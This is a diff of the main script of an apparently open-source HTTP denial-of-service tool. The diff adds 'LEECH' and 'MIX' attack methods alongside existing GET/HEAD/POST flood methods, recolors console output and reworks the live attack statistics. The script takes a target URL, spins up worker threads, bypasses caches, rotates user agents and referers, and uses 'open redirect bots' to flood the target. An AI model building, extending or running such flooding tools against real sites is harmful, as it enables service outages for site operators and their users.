@@ -4,6 +4,7 @@ try:
   import argparse
 except Exception as e:
   print('[ERROR] Failed to import argparse, aborting.')
+  print(f'\nStacktrace: \n{str(e).strip()}')
   debug = False
 
 if len(sys.argv) <= 1:
@@ -42,21 +43,29 @@ try:
   #import socks, socket # pysocks is outdated
   import time
   import requests
-  from colorama import Fore, init
+  from colorama import Fore, init; init()
   from random import randint, choice
   from urllib.parse import urlparse
   if debug: 
     s_took = "%.2f" % (1000 * (timer() - s_start))
-    print(f'[DEBUG] Importing modules took {str(s_took)} ms.')
+    print(f'{Fore.LIGHTBLACK_EX}[{Fore.WHITE}DEBUG{Fore.LIGHTBLACK_EX}]{Fore.RESET} Importing modules took {str(s_took)} ms.')
   else:
-    print('[INFO] Modules imported.')
+    print(f'{Fore.YELLOW}[{Fore.WHITE}INFO{Fore.YELLOW}]{Fore.RESET} Modules imported.')
 except Exception as e:
   print('[ERROR] Failed to import modules, aborting. Please consider "python3 -m pip install -r requirements.txt"')
   if debug: print(f'\n[DEBUG] Stacktrace: \n{str(e).strip()}')
   exit()
 
+# define some basic colors
+fr = Fore.RED
+fy = Fore.YELLOW
+fw = Fore.WHITE
+fg = Fore.GREEN
+fg2 = Fore.LIGHTBLACK_EX
+frr = Fore.RESET
+
 # Import depencies
-print('[INFO] Importing depencies, hold on.')
+print(f'{fy}[{fw}INFO{fy}]{frr} Importing depencies, hold on.')
 try:
   if debug: s_start = timer()
   from src.utils import *
@@ -64,12 +73,12 @@ try:
   from src.core import *
   if debug: 
     s_took = "%.2f" % (1000 * (timer() - s_start))
-    print(f'[DEBUG] Importing depencies took {str(s_took)} ms.')
+    print(f'{fg2}[{fw}DEBUG{fg2}]{frr} Importing depencies took {str(s_took)} ms.')
   else:
-    print('[INFO] Depencies imported.')
+    print(f'{fy}[{fw}INFO{fy}]{frr} Depencies imported.')
 except Exception as e:
-  print('[ERROR] Failed to import depencies, aborting.')
-  if debug: print(f'\n[DEBUG] Stacktrace: \n{str(e).strip()}')
+  print(f'{fr}[{fw}ERROR{fr}]{frr} Failed to import depencies, aborting.')
+  if debug: print(f'\n{fg2}[{fw}DEBUG{fg2}]{frr} Stacktrace: \n{str(e).strip()}')
   exit()
 
 method_dict = {
@@ -78,31 +87,30 @@ method_dict = {
   'HEAD': http_head, # HEAD flood
   'FAST': http_fast, # GET / flood
   'GETHEADPOST': http_ghp, 'GHP': http_ghp, # GET/HEAD/POST flood
-
+  'LEECH': http_leech, # leech attack
+  'MIX': http_mix # mixed http attack
 }
 if args['target'] is None:
-  sys.exit('[ERROR] No target specified.')
+  sys.exit(f'{fr}[{fw}ERROR{fr}]{frr} No target specified.')
 
 Core.bypass_cache = args['bypass_cache']
 
 if not args['method'] in method_dict.keys():
-    sys.exit('[ERROR] Invalid method')
+    sys.exit(f'{fr}[{fw}ERROR{fr}]{frr} Invalid method')
 
 init() # initialize console
 print_lock = threading.Lock() # creates a "lock" variable
 
 def main():
-  print('\n')
+  print('')
   with open('src/banner.txt', 'r') as fd:
     [print(line.strip('\n')) for line in fd.readlines()]
   
-  print('\n')
-  print(f' Target : [{args["target"]}]')
+  print(f'\n Target: [{args["target"]}]')
   print(f' Method: [{args["method"]}]')
   print(f' Duration: [{str(args["duration"])}]')
-  print(f' Workers: [{str(args["workers"])}]')
-
-  print('\n')
+  print(f' Bypass cache: {str(args["bypass_cache"])}')
+  print(f' Workers: [{str(args["workers"])}]\n')
 
   #if args['proxy'] != None:
   #  print(f' Proxy: [{str(args["proxy"])}]')
@@ -110,36 +118,36 @@ def main():
   if args['useragent'] is None:
     if debug: s_start = timer()
     print(f' User Agents: [{str(len(ualist))}]')
-    if debug: 
+    if debug:
       s_took = "%.2f" % (1000 * (timer() - s_start))
-      print(f' [DEBUG] Importing user agents took {str(s_took)} ms.')
+      print(f' {fg2}[{fw}DEBUG{fg2}]{frr} Importing user agents took {str(s_took)} ms.')
     
   if args['referer'] is None:
     if debug: s_start = timer()
     print(f' Referers: [{str(len(reflist)+len(orlist))}]')
     if debug: 
       s_took = "%.2f" % (1000 * (timer() - s_start))
-      print(f' [DEBUG] Importing referers took {str(s_took)} ms.')
+      print(f' {fg2}[{fw}DEBUG{fg2}]{frr} Importing referers took {str(s_took)} ms.')
   
   if debug: s_start = timer()
   print(f' Open Redirect bots: [{str(len(orlist))}]')
   if debug:
     s_took = "%.2f" % (1000 * (timer() - s_start))
-    print(f' [DEBUG] Importing open redirect bots took {str(s_took)} ms.')
+    print(f' {fg2}[{fw}DEBUG{fg2}]{frr} Importing open redirect bots took {str(s_took)} ms.')
   
   if debug: s_start = timer()
   print(f' Keywords: [{str(len(keywords))}]')
   if debug:
     s_took = "%.2f" % (1000 * (timer() - s_start))
-    print(f' [DEBUG] Importing keywords took {str(s_took)} ms.')
+    print(f' {fg2}[{fw}DEBUG{fg2}]{frr} Importing keywords took {str(s_took)} ms.')
 
 def attack():
   session = createsession()
   parsed = urlparse(str(args['target']))
   resolved_host = socket.gethostbyname(str(parsed.netloc)) if (not isIPv4(parsed.netloc) and not isIPv6(parsed.netloc) and not parsed.netloc.endswith('.onion')) else parsed.netloc
 
-  if isIPv6(resolved_host):
-    resolved_host = f'[{resolved_host}]'
+  if isIPv6(resolved_host): # small IPv6 check
+    resolved_host = f'[{resolved_host}]' # adding 
 
   s_start = timer() # timer used for counting avg rps
   for i in range(int(args['workers'])):
@@ -173,11 +181,11 @@ if __name__ == '__main__':
   clear()
 
   worker_amount = 20 if args['workers'] > 20 else args['workers']
+  s_start = timer() # timer used for counting rps
   while Core.attackrunning:
     try:
 
-      info_dict = calcbestworkers()
-      i = 0
+      info_dict = calcbestworkers(); i = 0
       for workerkey, workervalue in info_dict.items():
         if i >= 20: continue
         i += 1
@@ -187,30 +195,35 @@ if __name__ == '__main__':
         req_total = str(workervalue['req_total'])
 
         with print_lock:
-          print(f'[INFO] [{workerkey}] req_sent={req_sent} req_fail={req_fail} req_total={req_total} thread_count={str(Core.threadcount)}')
+          print(f'{fy}[{fw}INFO{fy}] [{fw}worker{frr}-{fw}{workerkey}{fy}]{frr} {fg}req_sent{frr}={req_sent} {fr}req_fail{frr}={req_fail} {fy}req_total{frr}={req_total} {fy}thread_count{frr}={str(Core.threadcount)}')
     except KeyboardInterrupt:
-      with print_lock:
-        print('Ciao!')
+      with print_lock: print('Ciao!')
       Core.attackrunning = False
-    except Exception:
-      Core.attackrunning = False
-    time.sleep(2)
+    except Exception: Core.attackrunning = False
+    
+    # calculate results
+    total_req_sent, total_req_fail, total_req = 0,0,0
+    for workerkey, workervalue in Core.infodict.items():
+      total_req_sent += workervalue['req_sent']
+      total_req_fail += workervalue['req_fail']
+      total_req += workervalue['req_total']
+    
+    s_took = "%.2f" % (timer() - s_start) # how long it took for the attack to finish
+    attack_length = s_took
+    try: rps = float(total_req)/float(s_took)
+    except: rps = 'None' # error :/
+    time_left = float(args["duration"]) - float(attack_length)
+    if int(time_left) < 0: time_left = 0
 
+    print(f'\n{fy}[{fw}INFO{fy}]{frr} Results: ')
+    print(f'   - Requests sent: {str(total_req_sent)}')
+    print(f'   - Requests failed: {str(total_req_fail)}')
+    print(f'   - Requests total: {str(total_req)}')
+    print(f'   - Attack took: {str(attack_length)}')
+    print(f'   - Time left: {str(time_left)}')
+    print(f'   - Current Requests per second: '+str(rps).replace('.', f'.{fg2}')+frr)
+
+    time.sleep(2 if args['method'].upper() != 'LEECH' else 10)
     if Core.attackrunning: 
       clear()
-  
-  # calculate results
-  total_req_sent = 0
-  total_req_fail = 0
-  total_req = 0
-  for workerkey, workervalue in Core.infodict.items():
-    total_req_sent += workervalue['req_sent']
-    total_req_fail += workervalue['req_fail']
-    total_req += workervalue['req_total']
-
-  print('\n[INFO] Results: ')
-  print(f'   Requests sent: {str(total_req_sent)}')
-  print(f'   Requests failed: {str(total_req_fail)}')
-  print(f'   Requests total: {str(total_req)}')
-  print(f'   Attack took: {str(Core.attack_length)}')
-  print(f'   Average requests per second: {str(Core.avg_rps)}')
+  print(f'   - Average requests per second: '+str(Core.avg_rps).replace('.', f'.{fg2}')+frr)
